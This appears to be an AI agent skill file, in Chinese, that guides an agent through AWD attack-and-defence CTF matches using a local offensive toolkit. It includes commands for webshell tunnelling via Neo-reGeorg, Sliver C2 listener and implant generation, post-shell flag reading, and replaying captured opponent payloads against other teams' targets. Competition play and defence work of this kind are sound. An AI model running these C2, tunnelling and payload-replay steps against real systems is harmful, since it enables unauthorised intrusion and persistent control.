---
name: awd-competition
description: AWD 攻防对抗赛（Attack With Defense）实战操作手册：本地武器库定位、收旗/交旗、批量靶机运维、漏洞挖掘优先级、防守加固与应急恢复。当用户提到 AWD、攻防赛、靶机、收旗、交旗、通防、批量 SSH、defense.sh、flag 提交，或要求用 AWD-Kit 的 nmap/ffuf/nuclei/sqlmap/蚁剑/冰蝎/哥斯拉/Sliver 做比赛操作时使用。
whenToUse: 用户在做 AWD/CTF 攻防比赛，需要侦察、打点、拿 shell、收 flag、交 flag、防守加固或应急恢复时。
---

# AWD 攻防赛实战手册

## 0. 先定位本机工具库

比赛环境固定在这台 Windows 上，武器库是 **`AWD-Kit` 根目录**（本 skill 同级的
`skills\..\`）。默认位置 `D:\AWD-Kit\`；换机器请按实际路径替换。
**不确定路径时先 `kit_info`（MCP）或在磁盘上搜 `AWD-Kit` 目录，不要猜。**

| 目录 | 内容 |
|---|---|
| `00-runtime\python\python.exe` | 便携 Python 3.12（已装 pwntools/paramiko/volatility3 等） |
| `00-runtime\node\node.exe` | 便携 Node（跑 MCP） |
| `00-runtime\go`、`00-runtime\jdk-21*`、`00-runtime\7-Zip` | Go / JDK / 7z |
| `01-recon` | nmap、ncat、fscan、kscan、httpx、nuclei、tshark、linpeas/winPEAS |
| `02-web` | Burp、sqlmap、ffuf、dirsearch、xpoc(xray)、CyberChef |
| `03-binary` | Ghidra、radare2、rizin、x64dbg、DIE、hashcat |
| `04-tunnel` | frp、chisel、Neo-reGeorg、Stowaway、Venom |
| `05-webshell` | 蚁剑、冰蝎、哥斯拉、Nishang、PowerCat |
| `06-c2` | Sliver(client/server)、Metasploit MSI、ConPtyShell |
| `07-revshell` | ConPtyShell、反弹 shell 速查 |
| `08-awd` | `awd.py`、`defense.sh`、`webshell_scan.py`、`revshell.md`、`checklist.md` |
| `traffic` | **靶机流量抓取/分析/payload 复用**：`capture.py`、`deploy.sh`、`analyze.py`、`replay.py`、`llm.py` |
| `mcp` | 5 个 MCP server：`awd-tools`、`awd-llm`、`ghidra`、`wireshark`、`frida` |

### 已挂载的 MCP（优先用，别手敲命令）

| 前缀 | 什么时候用 |
|---|---|
| `mcp__awd-tools__*` | 扫端口/目录/漏洞、发 HTTP、收旗交旗、批量打补丁、扫马 |
| `mcp__awd-llm__*` | 分析抓包、问大模型写 exp、列/重放 payload（`llm_status` 先查配置） |
| `mcp__radare2__*` | **无 GUI 反汇编**：`open_file` → `analyze` → `list_functions`/`decompile_function` |
| `mcp__ghidra__*` | Ghidra 里已打开程序时，反编译/交叉引用/改函数名 |
| `mcp__wireshark__*` | pcap 分析、协议统计、HTTP/DNS 解析（实时抓包需先装 Npcap） |
| `mcp__frida__*` | 动态注入、Hook、执行 JS |
| `mcp__memory__*` | 记靶机 IP/账号/flag/漏洞点，跨轮次不丢 |
| `mcp__chrome__*` | 浏览器自动化、抓请求、执行 JS、截图（需目标站点可访问） |

> 大模型 API 配在 `D:\AWD-Kit\traffic\llm.json`（`base_url`/`api_key`/`model`），
> 配好后 `mcp__awd-llm__llm_status` 会显示 ready=true。

## 1. 铁律（违反会直接丢分）

1. **先备份、先加固、再打人。** 顺序反了，被人改一次源码就崩。
2. **不要把自己的服务打挂。** 不整站只读、不全量 iptables DROP、不随便 kill 陌生进程。
3. **不要缓存旧 flag。** 每轮 flag 会刷新，必须重新读。
4. **交旗去重。** 同一 flag 重复提交可能触发限流/扣分。
5. **拿到 shell 先 `cat /flag`。** 别急着翻目录。

## 2. 标准一局流程

```powershell
# 先确认 kit 根目录（默认如下，换机器改成实际路径）
$KIT = 'D:\AWD-Kit'
$PY  = "$KIT\00-runtime\python\python.exe"
$AWD = "$KIT\08-awd\awd.py"
$CFG = "$KIT\08-awd\config.json"
```

**开赛 0–5 分钟**
```powershell
# 1) 把防守脚本推到所有靶机并做基线+备份+扫马+监控
& $PY $AWD push -l "$KIT\08-awd\defense.sh" -r /tmp/d.sh -C "bash /tmp/d.sh all"
# 2) 立刻收旗交旗
& $PY $AWD submit -c $CFG
# 3) 常驻收旗（放后台跑）
& $PY $AWD loop -c $CFG --interval 30
```

**5–30 分钟：找洞**
```powershell
# 拉源码审计
& $PY $AWD pull -c $CFG -r /var/www/html -o .\src
& $PY "$KIT\08-awd\webshell_scan.py" -d .\src --all
# 目录爆破 / POC 扫描
& "$KIT\02-web\ffuf\ffuf.exe" -u http://TARGET/FUZZ -w "$KIT\02-web\wordlist\common.txt" -fc 404
& "$KIT\01-recon\nuclei\nuclei.exe" -u http://TARGET -severity critical,high
& "C:\Program Files\Nmap\nmap.exe" -sV -Pn -T4 --top-ports 1000 TARGET
```

**每轮**
```powershell
& $PY $AWD exec -c $CFG -C "bash /tmp/d.sh scan"      # 查马/查后门
& $PY $AWD exec -c $CFG -C "bash /tmp/d.sh restore"   # 被改了就恢复
& $PY $AWD exec -c $CFG -C "bash /tmp/d.sh status"    # 看告警
```

## 3. 漏洞优先级（按命中率）

源码里按这个顺序 grep，命中率最高：
1. `file_get_contents('/flag')` / `cat /flag` —— 直接读 flag 的点，最优先
2. `system|exec|shell_exec|passthru|popen|assert|eval` + `$_GET/$_POST`
3. 文件上传 `move_uploaded_file` 无后缀/内容校验
4. SQL 拼接（`"... WHERE id=$id"`）
5. `unserialize($_COOKIE)` / `include($_GET['page'])` / SSRF `curl_exec($_GET['url'])`
6. 弱口令：admin/admin、root/root、mysql 空密码

**先跑 semgrep 再人工看**（比肉眼快一个数量级）：
```powershell
# MCP 工具
mcp__awd-tools__semgrep_scan(dir=".\\src", config="auto")
# 或命令行
& "$KIT\00-runtime\python\Scripts\semgrep.exe" --config auto .\src
```

## 4. 拿 shell 之后

```bash
cat /flag /flag.txt /root/flag /tmp/flag 2>/dev/null
find / -maxdepth 3 -name 'flag*' 2>/dev/null
ls -la /home /var/www /tmp          # 同机其他队伍
```
反弹 shell 见 `08-awd\revshell.md`（bash/nc/python/php/java/powershell/msfvenom/sliver 全都有）。

## 5. 防守要点

| 优先级 | 动作 | 命令 |
|---|---|---|
| 1 | 备份 web | `bash /tmp/d.sh backup` |
| 2 | 保护 flag | `chmod 400 /flag; chattr +i /flag` |
| 3 | 扫马 | `bash /tmp/d.sh scan` |
| 4 | 监控 | `bash /tmp/d.sh watch` |
| 5 | 恢复 | `bash /tmp/d.sh restore` |

不要做：整站 `chmod -R a-w`、全量 iptables DROP、删 flag、乱 kill 进程。

## 6. 流量分析 → 补洞 → 复用（核心得分循环）

AWD 所有队伍同源码：**对手打你的 exp，对你打别人同样有效**。

```powershell
$KIT='D:\AWD-Kit'; $PY="$KIT\00-runtime\python\python.exe"
# 1) 每台靶机部署抓包（纯标准库，靶机零依赖）
& $PY "$KIT\08-awd\awd.py" push -l "$KIT\traffic\capture.py" -r /tmp/.awd/capture.py
& $PY "$KIT\08-awd\awd.py" push -l "$KIT\traffic\deploy.sh"  -r /tmp/.awd/deploy.sh
& $PY "$KIT\08-awd\awd.py" exec -C "bash /tmp/.awd/deploy.sh start"
# 2) 分析（有 LLM 就加 --llm，能出代码级修复建议）
& $PY "$KIT\traffic\analyze.py" -i .\http.jsonl --llm
# 2b) 实时盯：新 payload 一出现就告警
& $PY "$KIT\traffic\watch.py" -i .\http.jsonl --llm
# 3) 复用对手 payload 打其他队
& $PY "$KIT\traffic\replay.py" -i .\http.jsonl --targets-file .\targets.txt -y
```

也可以用 MCP：`mcp__awd-llm__analyze_capture` / `list_payloads` / `replay_payloads`。

局限：只能抓明文 HTTP；需要 root；HTTPS 只能看到 SNI。

## 7. 工具速查

- **Burp**：`02-web\burpsuite_windows-x64_v2026_11.exe`（需 JDK，已在 `00-runtime`）
- **蚁剑**：`05-webshell\AntSword\AntSword.exe`
- **冰蝎**：`05-webshell\Behinder\`（Java 启动）
- **哥斯拉**：`05-webshell\godzilla.jar`（`java -jar`）
- **Sliver**：`06-c2\sliver-server_windows-amd64.exe` → `mtls --lport 8888` → `generate --mtls IP:8888`
- **Neo-reGeorg**：webshell 建隧道，`python neoreg.py -k PASS -u http://target/tunnel.php -p 1080`
- **Metasploit**：`06-c2\metasploitframework-latest.msi`（msfvenom 生成 payload）

## 7. 输出约定

- 给结论 + 可复制命令，不要长篇理论。
- 每条攻击命令前说清「打哪台、预期结果」。
- 涉及会改目标状态的命令（重启服务、改权限、删文件）先说明影响。
